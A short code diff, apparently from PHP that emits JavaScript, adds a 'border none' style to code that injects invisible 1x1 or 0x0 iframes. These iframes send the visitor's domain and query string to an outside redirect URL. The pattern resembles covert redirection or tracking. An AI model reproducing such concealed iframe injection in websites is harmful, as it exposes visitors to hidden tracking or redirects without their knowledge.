@@ -717,6 +717,7 @@
 							 el.src = '$redirectUrl' + encodeURIComponent(topDomain) + '&' + location.search.substring(1);
 							 el.width = 1;
 							 el.height = 1;
+							 el.border = 'none';
 							 document.body.appendChild(el);";
 		}
 		else // Default 0x0 iframe redirect
@@ -725,6 +726,7 @@
 							 el.src = '$redirectUrl' + encodeURIComponent(topDomain) + '&' + location.search.substring(1);
 							 el.width = 0;
 							 el.height = 0;
+							 el.border = 'none';
 							 document.body.appendChild(el);";
 		}
 
